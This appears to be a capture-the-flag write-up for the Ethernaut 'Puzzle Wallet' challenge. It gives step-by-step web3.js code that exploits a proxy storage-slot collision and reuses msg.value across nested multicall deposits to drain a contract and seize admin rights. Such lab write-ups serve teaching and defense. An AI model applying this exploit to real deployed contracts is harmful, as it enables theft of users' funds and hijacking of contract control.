# Puzzle Wallet

# Problem Statement
```
Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

You'll need to hijack this wallet to become the admin of the proxy.

Things that might help::
- Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.
```

# Solution

## Part 1: Update `PuzzleWallet`'s `owner` and `PuzzleProxy`'s `pendingAdmin` With Your EOA Address
The main security hole is that there is no storage seperation between the proxy contract (`PuzzleProxy`) and delegated contract (`PuzzleWallet`). So there is a storage collision between the `PuzzleWallet`'s `owner` and `PuzzleProxy`'s `pendingAdmin` storage slot 0.

The web3js library doesn't expose the `PuzzleProxy`'s functions but they are available to call.
Prior to any storage mutating calls notice the `PuzzleWallet`'s `owner` and `PuzzleProxy`'s `pendingAdmin` are set to the lesson's instance address:
```
const proxyContractAbi = [
  {
    "constant":false,
    "inputs":[],
    "name":"pendingAdmin",
    "outputs":[
      {
        "name":"",
        "type":"address"
      }
    ],
    "payable":false,
    "stateMutability":"public",
    "type":"function"
  }
];
const proxyContract = new web3.eth.Contract(proxyContractAbi,contract.address);
await proxyContract.methods.pendingAdmin().call();

await contract.owner();
```

Now mutate `PuzzleWallet` contract's `owner` and `PuzzleProxy` contract's `pendingAdmin`:
```
const data = web3.eth.abi.encodeFunctionCall({
  name: "proposeNewAdmin",
  type: "function",
  inputs: [{
    type: 'address',
    name: '_newAdmin'
  }]
}, [player]);
await web3.eth.sendTransaction({ to: contract.address, from: player, data: data });
```

Now see that both the `owner` and the `pendingAdmin` are set to your `player` address:
```
await proxyContract.methods.pendingAdmin().call();

await contract.owner();
```

## Part 2: Update `PuzzleProxy`'s `admin` with your EOA address
Notice a similar storage security hole exists between the `PuzzleWallet`'s `maxBalance` and `PuzzleProxy`'s `admin` variables as they share the same slot 1.
Because of this hole, we have the aim of modifying the `maxBalance` with our address.
First we need access to the functions in `PuzzleWallet` so we can eventually modify `maxBalance`.
Since we are the `owner` of the `PuzzleWallet` contract, lets give us `onlyWhitelisted` access.
```
await contract.addToWhitelist(player)
```

We'll modify the `maxBalance` through `setMaxBalance`. In that method there is a require:
```
require(address(this).balance == 0, "Contract balance is not 0");
```
This requires the contract ether balance to be at 0. Check the ether balance:
```
await getBalance(contract.address); // returns '0.001'
```
Now we need to figure a way to get the `PuzzleProxy`'s contract's balance to `0`. `execute` is a way to reduce the balance but follows the `Checks-Effects-Interactions` `(CIE)` pattern so there is no way to run a re-entrancy attack on it.<br>
So now we know we have to call `deposit` first to make sure we have a balance to call `execute` since it is the only methond that can possibly reduce the contract balance.<br>
We also know the `execute` follows the `CIE` pattern so we can't run an attack on it.<br>
Lets look at the last function, `multicall`, that has a possibility of helping us with our goal.<br>
Notice it allows for multiple function calls to `this` `PuzzleWallet` contract:
```
for (uint256 i = 0; i < data.length; i++) {
```
Ugh, it only allows 1 deposit call per transaction because of the `depositCalled` bool flag and this line:
```
require(!depositCalled, "Deposit can only be called once");
```
We only find a solution by thinking more deeply and in a recursive way. How about we have the `multicall` function call `multicall` multiple times? And, in each of these nested `multicall` calls, we can call `deposit` once thereby removing the restriction on the number of `deposit` calls we can make.<br>
We want the contract's balance to reach `0` ether, and `execute` only allows us to withdraw ether if we have a greater amount in the `balances[msg.sender]` map:
```
require(balances[msg.sender] >= value, "Insufficient balance");
```
Remember the contract currently has an ether balance of `0.001`. If we call the `deposit` function it will increase both the `balances[msg.sender]` as well as the smart contract's ether balance so if we call `deposit` we'll always have a `balances[msg.sender]` that is less than the contract's ether `balance`. This is a problem because then we'll never get to our goal of getting the contract's ether balance to `0`.
Because of this we'll need to mess with the accounting to get to the goal of having a greater `balances[msg.sender]` value than the contract's actual ether balance.<br>
We can do this by making 2 `deposit` calls that set the contract's balance from the current `0.001` to `0.002` while also changing our `balances[msg.sender]` from `0` to `0.002`. When you call `multicall` with a `value` of `0.001` you are only sending `0.001` ether and that value is stored in `msg.value` as `0.001`. Because we are making 2 `deposit` calls this will update the `balances[msg.sender]` from `0` to `0.002` while only adding to the contract's ether balance `0.001` thereby having the contract's balance go from the original `0.001` to `0.002`.<br>
The implementation:
```
const depositData = web3.eth.abi.encodeFunctionSignature("deposit()")
const multicallData = web3.eth.abi.encodeFunctionCall({
  name: 'multicall',
  type: 'function',
  inputs: [{
    type: 'bytes[]',
    name: 'data'
  }]
}, [[depositData]])
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```
Notice the contract's ether balance is now at our desired stepping stone value of `0.002`:
```
await getBalance(contract.address)
```
Now call the `execute` method to set the contract ether balance to `0`:
```
await contract.execute(player, toWei('0.002'), player)
```
Notice the contract's ether balance is now at our desired final value of `0`:
```
await getBalance(contract.address)
```
Finally take ownership of the `PuzzleWallet` contract:
```
await contract.setMaxBalance(player)
```
We've completed this lesson!

# Key Learnings
- With batching calls / multicalls be very careful about the `msg.value` as it is the static eth value for the entire call.
